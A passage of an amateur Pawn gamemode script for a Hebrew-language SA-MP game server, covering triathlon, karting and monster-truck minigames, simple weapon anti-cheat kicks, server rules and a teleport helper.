dini_IntSet(mode_file,"IsBanned",1);
TogglePlayerControllable(playerid,false);
return Kick(playerid);


}

forward UnFreezeTriatlon();
public UnFreezeTriatlon(){
for(new i=0; i<MAX_PLAYERS; i++)
{
if(RunPlayers < 1)
{
SendClientMessage(i,WHITE,".הטריאטלון בוטל סיבה מספר משתתפים נמוך מ-4");
RunSystemend =0;
RunPlayers=0;
RunSystemon=0;
if(Registertrs[i] ==1)
{
DisablePlayerRaceCheckpoint(i);
TogglePlayerControllable(i,1);
SetPlayerVirtualWorld(i,0);
Registertrs[i] = 0;
}
}
new string[256];
EndSystemTriatlon= SetTimer("EndSystemTriatlon2",3000,1);
SendClientMessage(i,WHITE,"[______________מירוץ מאורגן - טריאטלון______________]");
format(string,sizeof(string)," %d :מס' משתתפים",RunPlayers),SendClientMessage(i,0xE21E1EFF,string);
SendClientMessage(i,0xE21E1EFF,"המנצח יקבל סכום מכובד של 3000$");
SendClientMessage(i,WHITE,".--------------------------------------");

TogglePlayerControllable(i,1);
RaceEnd=1;
}
return 1;
}


forward EndSystemTriatlon2();
public EndSystemTriatlon2()
{
if(RunSystemend ==0) return KillTimer(EndSystemTriatlon);
if(RunPlayers < 4)
{
for(new i=0; i<MAX_PLAYERS; i++)
{
SendClientMessage(i,WHITE,".הטריאטלון בוטל סיבה מספר משתתפים נמוך מ-4");
KillTimer(EndSystemTriatlon);
RunSystemend =0;
RunPlayers=0;
if(Registertrs[i] ==1)
{
CPTriatlon[i]=0;
DisablePlayerRaceCheckpoint(i);
TogglePlayerControllable(i,1);
}
}
}

for(new v = 0; v < 10; v++)
{
SetVehicleToRespawn(triamountion[v]);
}
return 1;
}

//=[Karting`start]==============================================
forward KartStart();
public KartStart()
{
new string[256];
MoneyWinnerKart =1000;
SendClientMessageToAll(WHITE,"[_____________גאטר - קרב הקרטים_____________]");
SendClientMessageToAll(0xE21E1EFF, "! נפתחה הרשמה לקרב הקרטים, הזדרזו להירשם מקומות: 29");
format(string,sizeof(string),".$%d :פרס למנצח מתחיל מסכום של",MoneyWinnerKart);
SendClientMessageToAll(0xE21E1EFF,string);
SendClientMessageToAll(0x0F6A0FF, "/JoinKart :יש לכם 45 שניות להירשם,להצטרפות רשמו");
SendClientMessageToAll(WHITE,".---------------------------------");
KartOn = 1; KartPlayers = 0;
Countk = 45; cuntdownk(); CountFuck = 1;
return 1;
}
//=[CountKart]=====================================================
forward cuntdownk();
public cuntdownk() {
new string[256];
if(Countk == 40)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /JoinKart.",KartPlayers);
SendClientMessageToAll(COLOR_WHITE,string);
}
else if(Countk == 20)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /JoinKart.",KartPlayers);
SendClientMessageToAll(COLOR_WHITE,string);
}
else if(Countk == 10)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /JoinKart.",KartPlayers);
SendClientMessageToAll(COLOR_WHITE,string);
}
new String[256];
format(String, 256,"~w~%d",Countk);
for(new i = 0; i < MAX_PLAYERS; i++)
GameTextForAll(String,1000,6);
if(Countk > 0)
{
--Countk;
SetTimer("cuntdownk", 1000, 0);
}
else
{
if(CountFuck == 1)
{
TeleportPlayerToKart();
if(knoobk == 1)
{
Countk = 3; cuntdownk(); CountFuck = 2;
}
}
if(CountFuck == 2 && Countk <= 0)
{
Unfreezek();
}
}
}


//=[Teleport`s-Karting`s]===============================
forward TeleportPlayerToKart();
public TeleportPlayerToKart()
{
if(KartPlayers < 1)
{
KartEnd(0);
return 1;
}
new string[256];
SendClientMessageToAll(WHITE,"[______________!גאטר קארט - החל______________]");
format(string,sizeof(string)," %d :מס' משתתפים",KartPlayers),SendClientMessageToAll(0xE21E1EFF,string);
format(string,sizeof(string)," $%d :סכום זכייה שנקבע על ידי השחקנים הוא",MoneyWinnerKart),SendClientMessageToAll(0xE21E1EFF,string);
SendClientMessageToAll(WHITE,".--------------------------------------");
KS = 1;
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InKart[i] == 1)
{
ResetPlayerWeapons(i);
SetPlayerVirtualWorld(i,0);
TogglePlayerControllable(i, 0);
PutPlayerInVehicle(i,caridxx[i], 0);

ResetPlayerWeapons(i);
KK[i] = 1; knoobk = 1;
KCheckTime = SetTimer("KCheck",1000, 1);
KCheckSec = SetTimer("KCheckSecs",1000, 1);
}
}
return 1;
}


forward KCheck();
public KCheck()
{
if(KS == 1)
{
if(KartPlayers == 1)
{
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InKart[i] == 1)
{
KartWinner = i; KartEnd(1);
}
}
}
} return 1;
}

forward KCheckSecs(playerid);
public KCheckSecs(playerid)
{
new Float:p[3];
if(KS == 1)
{
for(new i = 0;i<MAX_PLAYERS;i++)
{
GetPlayerPos(i,p[0],p[1],p[2]);
if(KK[i] == 1 && p[2] <  34.0)
{
KartPlayers --; InKart[i] = 0; KK[i] = 0;
//editprofilelayerPos(i,-2599.8259,1096.2352,57.1251);
SendClientMessage(i,WHITE,".Kart :עזבת את הפעילות ");
DestroyVehicle(caridxx[i]);
SetPlayerPos(i,2057.0664,843.0209,6.7031);

}
}
}
return 1;
}


forward Unfreezek();
public Unfreezek() {
for(new i = 0;i<MAX_PLAYERS;i++) {
if(KK[i] == 1) {
TogglePlayerControllable(i, 1);
SetCameraBehindPlayer(i);
GameTextForAll("~r~Kart ~p~Start", 3000, 0);
Fuck[i] = 1;
} } }



forward KartEnd(status);
public KartEnd(status)
{
if(status == 0)
{
SendClientMessageToAll(red, ".הגאטר בוטל בגלל חוסר שחקנים שהיה פחות מ-3");
SendClientMessageToAll(red, ".כל שחקן שהצטרף קיבל פיצוי בסך 500 דולר");
KartOn = 0; KartPlayers = 0;
KillTimer(KCheckTime);
KillTimer(KCheckSec);
KartOn =0;
for(new i=0;i<MAX_PLAYERS;i++)
{
if(InKart[i] == 1)
{
SendClientMessage(i,COLOR_ORANGE,".קיבלת פיצוי בסך [500] דולר על סיבה: חוסר משתתפים בגאטר");
LACY_GiveMoney(i,500);
InKart[i] = 0;  KK[i] = 0; KS = 0; knoobk = 0; Fuck[i] = 0;
DestroyVehicle(caridxx[i]);
}
}
return 1;
}
else if(status == 1)
{
KartOn = 0;
KartPlayers = 0;
KS = 0;

LACY_GiveMoney(KartWinner, 10000);
GetPlayerName(KartWinner, playername, sizeof(playername));
KillTimer(KCheckTime);
KillTimer(KCheckSec);
SetPlayerInterior(KartWinner, 0);
LACY_GiveMoney(KartWinner,MoneyWinnerKart);
PlayerInfo[KartWinner][Kart] ++;
GetPlayerName(KartWinner, playername, sizeof(playername));
SendClientMessageToAll(WHITE,"[________ גאטר קארט - מנצח ________]");
format(fuxm, sizeof(fuxm), ".$%d ניצח בקרב הקארטים, סכום הזכייה שהוא קיבל,(%d) ,%s",MoneyWinnerKart,KartWinner, GetName(KartWinner)),SendClientMessageToAll(0xE21E1EFF, fuxm);
format(fuxm, sizeof(fuxm), ".%d מספר הנצחנות שלו בקארטינג",PlayerInfo[KartWinner][Kart]),SendClientMessageToAll(0xE21E1EFF, fuxm);
SendClientMessageToAll(WHITE,".-------------------------------------");TogglePlayerControllable(KartWinner, 1);
DestroyVehicle(caridxx[KartWinner]);
for(new i=0;i<MAX_PLAYERS;i++) {
InKart[i] = 0; KS = 0; KK[i] = 0; knoobk = 0; Fuck[i] = 0;
KartOn =0;

if(InKart[i] ==1) {
DestroyVehicle(caridxx[i]);
}}
return 1;
}
else if(status == 2) {
//format(fux, sizeof(fux), ".ביטל את קארטינג\"%s\" האדמין ", Adminname);
//SendClientMessageToAll(COLOR_PINK, fux);
KartPlayers = 0;
knoobk = 0;
KS = 0;
KartOn = 0;
Countk = 0; CountFuck = 0;
KillTimer(KCheckTime);
KillTimer(KCheckSec);
for(new i=0;i<MAX_PLAYERS;i++) {
InKart[i] = 0; KK[i] = 0; Fuck[i] = 0;
DestroyVehicle(caridxx[i]);
}
return 1;
}
return 1; }


forward MonsterStart();
public MonsterStart() {
MoneyWinnerMonster =1000;
new string[256];
SendClientMessageToAll(WHITE,"[_____________גאטר - מכוניות מתנגשות_____________]");
SendClientMessageToAll(0xE21E1EFF, "! נפתחה הרשמה לקרב מונסטרים, הזדרזו להרשם");
format(string,sizeof(string),".$%d :פרס למנצח מתחיל מסכום של",MoneyWinnerMonster);
SendClientMessageToAll(0xE21E1EFF,string);
SendClientMessageToAll(0x0F6A0FF, "/Monster :יש לכם 45 שניות להירשם,להצטרפות רשמו");
SendClientMessageToAll(WHITE,".---------------------------------");


MonsterOn = 1; MonsterPlayers = 0;
MonsterCount = 45; MonsterCountdown(); CountMoneterfu = 1;
return 1; }
//==================================MonsterCountdown==================================
forward MonsterCountdown();
public MonsterCountdown() {
new string[256];
if(MonsterCount == 40)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /Monster.",MonsterPlayers);
SendClientMessageToAll(COLOR_WHITE,string);
}
else if(MonsterCount == 20)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /Monster.",MonsterPlayers);
SendClientMessageToAll(COLOR_WHITE,string);
}
else if(MonsterCount == 10)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /Monster.",MonsterPlayers);
SendClientMessageToAll(COLOR_WHITE,string);
}
new String[256];
format(String, 256,"~W~%d",MonsterCount);
for(new i = 0; i < MAX_PLAYERS; i++)
GameTextForAll(String,1000,6);
if(MonsterCount > 0)
{
--MonsterCount;
SetTimer("MonsterCountdown", 1000, 0);
}
else
{
if(CountMoneterfu == 1)
{
TeleportPlayerToMONSTER();
if(MonNoob == 1)
{
MonsterCount = 10; MonsterCountdown(); CountMoneterfu = 2;
}
}
if(CountMoneterfu == 2 && MonsterCount <= 0) {
UnfreezeMonster();
}
}
}
//==================================UnfreezeMonster====================================
forward UnfreezeMonster();
public UnfreezeMonster() {
for(new i = 0;i<MAX_PLAYERS;i++) {
if(MonsterNoTeleportion[i] == 1)
 {
TogglePlayerControllable(i, 1);
SetCameraBehindPlayer(i);
GameTextForAll("~g~Monster STARTED!", 3000, 0);
MonsterFucker[i] = 1;
MCheckTimeMonster = SetTimer("MonsterCheck",1000, 1);
MonStart[i] =1;
} } }
//=============================TeleportPlayerToMONSTER==============================
forward TeleportPlayerToMONSTER();
public TeleportPlayerToMONSTER() {
if(MonsterPlayers < MiNmOnsterPlayers) {
MonsterWL(0);
return 1; }
new string[256];
SendClientMessageToAll(WHITE,"[______________!גאטר קארט - החל______________]");
format(string,sizeof(string)," %d :מס' משתתפים",MonsterPlayers),SendClientMessageToAll(0xE21E1EFF,string);
format(string,sizeof(string)," $%d :סכום זכייה שנקבע על ידי השחקנים הוא",MoneyWinnerMonster),SendClientMessageToAll(0xE21E1EFF,string);
SendClientMessageToAll(WHITE,".--------------------------------------");

for(new i = 0; i < MAX_PLAYERS; i++){
if(IsPlayerConnected(i) && iNmOnster[i]==1)
{
ResetPlayerWeapons(i);
MoOn = 1; MonsterNoTeleportion[i] = 1; MonNoob = 1;
TogglePlayerControllable(i, 0);
SetCameraBehindPlayer(i);
KillTimer(MCheckTimeMonster);
KillTimer(KcheckMonster);
} }
return 1; }


//===================================MonsterWL=====================================
forward MonsterWL(status);
public MonsterWL(status) {
if(status == 0)
{
SendClientMessageToAll(red, ".הגאטר בוטל בגלל חוסר שחקנים שהיה פחות מ-3");
SendClientMessageToAll(red, ".כל שחקן שהצטרף קיבל פיצוי בסך 500 דולר");

MonsterOn = 0; MonsterPlayers = 0;
KillTimer(MCheckTimeMonster);
KillTimer(KcheckMonster);
for(new i=0;i<MAX_PLAYERS;i++) {
if(iNmOnster[i] == 1)
{
iNmOnster[i] = 0;  MonsterNoTeleportion[i] = 0; MoOn = 0; MonNoob = 0; MonsterFucker[i] = 0;
SendClientMessage(i,COLOR_ORANGE,".קיבלת פיצוי בסך [500] דולר על סיבה: חוסר משתתפים בגאטר");
LACY_GiveMoney(i,500);
DestroyVehicle(MonsterSYSTEM[i]);
}
}
return 1;
}
else if(status == 1)
{
MonsterOn = 0; MonsterPlayers = 0;


KillTimer(MCheckTimeMonster);
KillTimer(KcheckMonster);

new rand = random(sizeof(gRandomPlayerSpawns));
SetPlayerPos(MonsterWinner, gRandomPlayerSpawns[rand][0], gRandomPlayerSpawns[rand][1], gRandomPlayerSpawns[rand][2]); // Warp the player
LACY_GiveMoney(MonsterWinner,MoneyWinnerMonster);
PlayerInfo[MonsterWinner][Monster] ++;
GetPlayerName(MonsterWinner, playername, sizeof(playername));

SendClientMessageToAll(WHITE,"[________ גאטר מכוניות מתנגשות - מנצח ________]");
format(fuxm, sizeof(fuxm), ".$%d ניצח בקרב מונסטרים, הכסף שהוא זכה בוא עומד על כ,%s",MoneyWinnerMonster,GetName(MonsterWinner)),SendClientMessageToAll(0xE21E1EFF, fuxm);
format(fuxm, sizeof(fuxm), ".%d מספר הנצחנות שלו בקרב טילים",PlayerInfo[MonsterWinner][Monster]),SendClientMessageToAll(0xE21E1EFF, fuxm);
SendClientMessageToAll(WHITE,".-------------------------------------");


SetPlayerPos(MonsterWinner,2144.1472,1634.6127,993.5761);
SetPlayerInterior(MonsterWinner,1);
MoneyWinnerMonster =0;
for(new i=0;i<MAX_PLAYERS;i++) {
iNmOnster[i] = 0; MoOn = 0; MonsterNoTeleportion[i] = 0; MonNoob = 0; MonsterFucker[i] = 0;
DestroyVehicle(MonsterSYSTEM[i]);
}
return 1;
}
else if(status == 2) {
format(MonsterFux, sizeof(MonsterFux), ".ביטל את הגאטר \"%s\" האדמין ", Adminname);
SendClientMessageToAll(lblue, MonsterFux);
MonsterPlayers = 0;
MonNoob = 0; MoOn = 0;
MonsterOn = 0;
MonsterCount = 0; CountMoneterfu = 0;
KillTimer(MCheckTimeMonster);
for(new i=0;i<MAX_PLAYERS;i++) {
iNmOnster[i] = 0; MonsterNoTeleportion[i] = 0; MonsterFucker[i] = 0;
DestroyVehicle(MonsterSYSTEM[i]); }
return 1; }
return 1; }

forward MonsterCheck();
public MonsterCheck() {
if(MoOn == 0) return 0;
if(MoOn == 1) {
if(MonsterPlayers == 1) {
for(new i = 0;i<MAX_PLAYERS;i++) {
if(MonsterNoTeleportion[i] == 1) {
MonsterWinner = i; MonsterWL(1);
} } } } return 1; }




//=[AntiMinigun`s]===================================================
forward AntiMinigun();
public AntiMinigun()
{
new weapon;
new gunammo;
new str[256];
for(new i = 0; i < 200; i++)
{
for (new x = 0; x < 13; x++)
{
if(PPw[i] == 1||  InWarw[i] == 1 || InDM[i] == 1 || InDM[i] == 2 || InDM[i] == 3) return 0;
GetPlayerWeaponData(i, x, weapon, gunammo);
if(IsPlayerXAdmin(i,1)) return 0;
if((weapon == 38) && gunammo > 1)
{
ResetPlayerWeapons(i);
}
if((weapon == 38) && gunammo > 1)
{
SendClientMessage(i,red,"Weapon Hack .מערכת האנטי צ'יט זיההתה אצלך, צ'יט מסוג");
format(str, sizeof(str), "Anti Hackers || %s has been cos using Weapon Hack." , GetName(i));
SendClientMessageToAllEx(i,red,str);
Kick(i);
break;
}
continue;
}
}
return 1;
}
//=[AntiBazooka]==================================================
forward AntiBaz();
public AntiBaz()
{
new weapon;
new gunammo;
new str[256];
for(new i = 0; i < 200; i++)
{
for (new x = 0; x < 13; x++)
{
if(IsPlayerXAdmin(i,1)) return 0;

if(PPr[i] == 1 || PlayerInfo[i][bazooka] > 0 || InWarr[i] == 1 || InDM[i] == 1 || InDM[i] == 2 || InDM[i] == 3) return 0;
GetPlayerWeaponData(i, x, weapon, gunammo);
if((weapon == 35 || weapon == 36) && gunammo > 1)
{
ResetPlayerWeapons(i);
}
if((weapon == 35 || weapon == 36) && gunammo > 1)
{
SendClientMessage(i,red,"Weapon Hack .מערכת האנטי צ'יט זיההתה אצלך, צ'יט מסוג");
format(str, sizeof(str), "Anti Hackers || %s has been cos using Weapon Hack." , GetName(i));
SendClientMessageToAllEx(i,red,str);
Kick(i);
break;
}
continue;
}
}
return 1;
}
//=[AFKick]========================================================
/*
frward AFKick(playerid);
public AFKick(playerid)
{
if(isafk[playerid] == 1) return 0;
if (IsPlayerXAdmin(playerid,1)) return 0;

GetPlayerPos(playerid, AFKPos[playerid][0], AFKPos[playerid][1], AFKPos[playerid][2]);
if(AFKPos[playerid][0] == AFKPos[playerid][3] && AFKPos[playerid][1] == AFKPos[playerid][4] && AFKPos[playerid][2] == AFKPos[playerid][5])
{
new player[MAX_PLAYER_NAME], string[256];
GetPlayerName(playerid, player, sizeof(player));
format(string, sizeof(string), "*** %s has been kicked ( AFK)", player);
SendClientMessageToAll(red, string);
Kick(playerid);
return 1;
}

AFKPos[playerid][3] = AFKPos[playerid][0];
AFKPos[playerid][4] = AFKPos[playerid][1];
AFKPos[playerid][5] = AFKPos[playerid][2];
return 1;
}
*/
//=[StockColor]=====================================================
stock sgba2hex(s,g,b,a) return (s*16777216) + (g*65536) + (b*256) + a;
stock rgba2hex(a,x,z,v) return (a) + (x) + (z*256) + v;

//=[Forward]========================================================
forward Msc(playerid);
//=[Public]==========================================================
public Msc(playerid) return RK_GM(playerid,3000,":קיבלת משכורת בסך של",COLOR_YELLOW,1);
//=[Rk.include]==============================================================
//=[RK_HP]========================================================
stock RK_HP(playerid,Float:Health,price,messagess[],scolor)
{
new string[256];
if(GetPlayerMoney(playerid) < price) return SendClientMessage(playerid,WHITE,".אין לך מספיק כסף לקנות את החיים אתה  צריך לפחות כ1500 דולר");
LACY_GiveMoney(playerid,-price);
format(string,sizeof(string),"%s ,%s",messagess,GetName(playerid));
SendClientMessageToAll(scolor,string);
SetPlayerHealth(playerid,Float:Health);
return 1;
}
//=[RK_GiveWeapons]==============================================
stock RK_GiveSetWeapons(playerid,weaponid,ammu,weaponid2,ammu2,weaponid3,ammu3,price)
{
if(GetPlayerMoney(playerid) < price) return SendClientMessage(playerid,WHITE,".אין לך מספיק כסף לקנות את הסט נשקים אתה צריך לפחות כ6000 דולר");
LACY_GiveMoney(playerid,-price);
GivePlayerWeapon(playerid,weaponid,ammu);
GivePlayerWeapon(playerid,weaponid2,ammu2);
GivePlayerWeapon(playerid,weaponid3,ammu3);
return 1;
}
//=[RK_SA / SetPlayerArmour]=======================================================
stock RK_SA(playerid,Float:Armour,price,messages[],scolor)
{
new string[256];
if(GetPlayerMoney(playerid) < price) return SendClientMessage(playerid,WHITE,".אין לך מספיק כסף לקנות את המגן אתה צריך לפחות כ2000 דולר");
SetPlayerArmour(playerid,Float:Armour);
LACY_GiveMoney(playerid,-price);
format(string,sizeof(string),"%s ,%s",messages,GetName(playerid));
SendClientMessageToAll(scolor,string);
return 1;
}
//=[Rk_GM / GivePlayerMoney]=====================================================
stock RK_GM(playerid,moneys,mm[],mcolor,number)
{
if(number == 0)
{
new string[256];
LACY_GiveMoney(playerid,moneys);
format(string,sizeof(string),"$%d %s",moneys,mm);
SendClientMessage(playerid,mcolor,string);
return 1;
}
if(number == 1)
{
fnm
new string[256];
LACY_GiveMoney(i,moneys);
format(string,sizeof(string),"$%d %s",moneys,mm);
SendClientMessage(i,mcolor,string);
}
}
return 1;
}
//=[r]====
forward Rules(playerid);
public Rules(playerid)
{
SendClientMessage(playerid, red,".---:Rules the server | Satla-Zone.co.il | חוקי השרת ----");
SendClientMessage(playerid, COLOR_GREY,"(1) :אנא דבר בכבוד לאדמינים ולחברי השרת");
SendClientMessage(playerid, COLOR_GREY, "(2) :אין להציף תצ'אט בהודעות סתמיות");
SendClientMessage(playerid, COLOR_GREY, "(3) :צי'טים יגררו לבאן ישירות");
SendClientMessage(playerid, COLOR_GREY, "(4) :אין להרוג בשדה התעופה / רייס עם מסוק / הידרה");
SendClientMessage(playerid, COLOR_GREY, "(5) :אין לפרסם כתובת מגורים / מספרי פלאפון");
SendClientMessage(playerid, COLOR_GREY, "(6) - (Swapn Kill).אין לעשות הרג חברי על מנת ליצר לכם סטאטס גבוה יותר");
SendClientMessage(playerid, COLOR_GREY, "(7) :אין להרוג אדמין לבן - אדמין בתפקיד");
SendClientMessage(playerid, COLOR_GREY, "(8) - /report :אנא אל תדווחו בשרת על צי'טירים בצ'אט אנא דווחו בפקודה");
SetTimerEx("ConPlayer",15*1000,0,"i",playerid);
return 1;
}
/*
new tilim[MAX_PLAYERS];
new Float:postions[3];
new Float:Objectp[3];
//=[New]========================

forward BoomPlayer();
public BoomPlayer()
{
fnm
if(InArea(i, 404.8684, 35.6969, 2102.7212, 1653.4156))
{
if(PlayerInfo[i][VIPS] >= 1) return 0;
if(NoMoreObject[i] == 0)
{
tilim[i] = CreateStreamObject(354,212.5598,1895.0790,16.2901, 0.0000,0.0000,0.0000);
SendClientMessage(i,WHITE,".נשלח עליך ברגעים האלו אנא תברח מהר ממפקדה לפני שתפגע VIPשים לב, טיל ממפקדת ה");
NoMoreObject[i] = 1;
}
SetTimerEx("Setil",100,0,"i",i);
}
}
return 1;
}
*/
/*
forward Setil(playerid);
public Setil(playerid)
{
if(InArea(playerid, 404.8684, 35.6969, 2102.7212, 1653.4156))
{
GetPlayerPos(playerid,postions[0],postions[1],postions[2]);
MoveStreamObject(tilim[playerid] ,postions[0],postions[1],postions[2],110);
GetStreamObjectPos(tilim[playerid] ,Objectp[0],Objectp[1],Objectp[2]);
if(PlayerToPoint(27.0,playerid,Objectp[0],Objectp[1],Objectp[2]))
{
EXPLODEs(playerid);
}
}

return 1;
}
forward EXPLODEs(playerid);
public EXPLODEs(playerid)
{
GetPlayerPos(playerid,postions[0],postions[1],postions[2]);
CreateExplosion(postions[0],postions[1],postions[2],10,10);
NoMoreObject[playerid] = 1;
SetPlayerHealth(playerid,0.0);
DestroyStreamObject(tilim[playerid]);
SetTimerEx("ResetTilimt",30*1000,0,"i",playerid);
return 1;
}
forward ResetTilimt(playerid);
public ResetTilimt(playerid)return NoMoreObject[playerid] = 0;
*/
forward AntiGamebling();
public AntiGamebling()
{
for(new i=0; i<MAX_PLAYERS; i++)
{
if(InArea(i, 1987.5336,1925.3849, 1051.0730, 968.4362))
{
SendClientMessage(i,WHITE,".הכניסה לקזינו אסורה בהחלט");
SetPlayerPos(i,2057.0664,843.0209,6.7031);
SetPlayerFacingAngle(i,357.5948);
SetPlayerInterior(i,0);
}
}
return 1;
}

stock InArea(playerid, Float:max_x, Float:min_x, Float:max_y, Float:min_y)
{
new Float:X, Float:Y, Float:Z;
GetPlayerPos(playerid, X, Y, Z);
if(X <= max_x && X >= min_x && Y <= max_y && Y >= min_y) return 1;

return 0;
}

//if(InAreaShip(playerid, 1995.5, 1518.0, 2006.0, 1569.0)) return SendClientMessage(playerid,red,"!אינך יכול לשלוח כסף שאתה נמצא בספינת הכסף");
stock InAreaShip(playerid, Float:x1, Float:y1, Float:x2, Float:y2)
{
new Float:X, Float:Y, Float:Z;
GetPlayerPos(playerid, X, Y, Z);
if(X >= x1 && X <= x2 && Y >= y1 && Y <= y2) return 1;
return 0;
}

//=[IsAreaPart]
/*
forward IsBallInArea(x);
public IsBallInArea(x=0)
{
if(IsObjectInZone(football, 127.5067,42.8843,2524.0745,2475.0125))
{
x++;
}
else
{
SendClientMessageToAll(WHITE,".הכדור יצא מתחומי המגרש,לכן הכדור שוחזר");
DestroyObject(football);
football=CreateStreamObject(1598, 89.615692, 2500.632324, 15.789375, 0.0000, 0.0000, 0.0000*x);
x=0;
}
return 1;
}

return 1;
}
stock IsObjectInZone(ObjectName, Float:max_x, Float:min_x, Float:max_y, Float:min_y)
{
new Float:X, Float:Y, Float:Z;
GetStreamObjectPos(ObjectName, X, Y, Z);
if(X <= max_x && X >= min_x && Y <= max_y && Y >= min_y) return 0+1*1;
return 1*1.00;
}
*/
stock Messagelevel (playerid, alevels)
{
new st[256];
format(st, sizeof(st), ".%d על מנת לבצע את הפקודה הזו עליך להיות רמה", alevels);
SendClientMessage(playerid,red, st);
return 1;
}
//=[CreateTeleport]==
stock CreateTeleport(playerid,Interior,Float:x,Float:y,Float:z,Float:a,WithVehicle)
{
if(GetPlayerState(playerid) == 7) return SendClientMessage(playerid,red,".אינך יכול להשתגר שאתה בוחר דמות אנא בחר דמות ולאחר מכן השתגר");
new string[256];
new Float:healthteleportion;
GetPlayerHealth(playerid,healthteleportion);
new CreateHealth[MAX_PLAYERS];
if(isafk[playerid] == 1)
{
OnPlayerCommandText(playerid,"/UNAFK");
return 0;
}
if(InCounterStrike[playerid] > 0)
{
SpawnPlayer(playerid);
InCounterStrike[playerid] = 0;
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
SendClientMessage(playerid,red,".Counter Strike פרשת מהמשחק");
SetPlayerInterior(playerid,0);
SetPlayerTeam(playerid,0);
SetPlayerColor(playerid,sgba2hex(random(256),random(256),random(256),83));
}

if(Injetpack[playerid] == 1)
{
jetpackPlayers --; Injetpack[playerid] = 0; Pjetpackin[playerid] = 0;
GangZoneHideForPlayer(playerid,gang_jp);
}
if(InDM[playerid] > 0)
{
OnPlayerCommandText(playerid,"/qdmz");
ResetPlayerWeapons(playerid);
SetPlayerHealth(playerid,0.0);
SetTimerEx("QDMZ",4*1000,0,"i",playerid);
SetPlayerVirtualWorld(playerid,0);
}
if(Youregisterrace[playerid] ==1)
{
SetPlayerHealth(playerid,0.0);
Youregisterrace[playerid] =0;
RacePlayers--;
DisablePlayerRaceCheckpoint(playerid);
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
}
if(YouRegister[playerid] ==1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
SetPlayerHealth(playerid,0.0);
YouRegister[playerid] =0;
DisablePlayerRaceCheckpoint(playerid);
DriftPlayer--;
}
if(Registertrs[playerid] ==1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerHealth(playerid,0.0);
CPTriatlon[playerid]=0;
DisablePlayerRaceCheckpoint(playerid);
Registertrs[playerid] =0;
CPTriatlon[playerid]=0;
RunPlayers--;
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
}
//END
if(KK[playerid] == 1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");

SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
KartPlayers --;
InKart[playerid] = 0;
KK[playerid] = 0;
Fuck[playerid] = 0;
DestroyVehicle(caridxx[playerid]);

}

if(MonsterNoTeleportion[playerid] == 1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
iNmOnster[playerid] = 0;
MonsterPlayers --;
iNmOnster[playerid] = 0;
MonsterNoTeleportion[playerid] = 0;
MonsterFucker[playerid] = 0;
DestroyVehicle(MonsterSYSTEM[playerid]);
MonStart[playerid] =0;
}

if(PGrein[playerid] == 1)
{
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
GrePlayers --; InGre[playerid] = 0; PGrein[playerid] = 0;
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
}

if(PPw[playerid] == 1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
ResetPlayerWeapons(playerid);
WarPlayersw --; InWarw[playerid] = 0; PPw[playerid] = 0;
SetPlayerVirtualWorld(playerid,0);
}
if(PP[playerid] == 1)
{
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
SendClientMessage(playerid,red,".עזבת את הפעילות שבה הייתה");
WarPlayers --;
InWar[playerid] = 0;
PP[playerid] = 0;
}
if(PPr[playerid] == 1)
{
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
ResetPlayerWeapons(playerid);
ResetPlayerWeapons(playerid);
WarPlayersr --; InWarr[playerid] = 0; PPr[playerid] = 0;
SendClientMessage(playerid,red,".עזבת את הפעילות שבה הייתה");
}
if(InBike[playerid] > 0)
{
SendClientMessage(playerid,red,".עזבת את הפעילות שבה הייתה");
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
BikePlayers --;
InBike[playerid] =0;
new vehicleidss = GetPlayerVehicleID(playerid);
SetVehicleVirtualWorld(vehicleidss,0);
}
if(PlayerInfo[playerid][Level] == 0 && healthteleportion < 75.0) return CreateHealth[playerid]=75,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
if(PlayerInfo[playerid][Level] == 1 && healthteleportion < 70.0) return CreateHealth[playerid]=70,SendClientMessage(playerid,red,".70 על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם"),0;
if(PlayerInfo[playerid][Level] == 2 && healthteleportion < 65.0) return CreateHealth[playerid]=65,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
if(PlayerInfo[playerid][Level] == 3 && healthteleportion < 60.0) return CreateHealth[playerid]=60,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
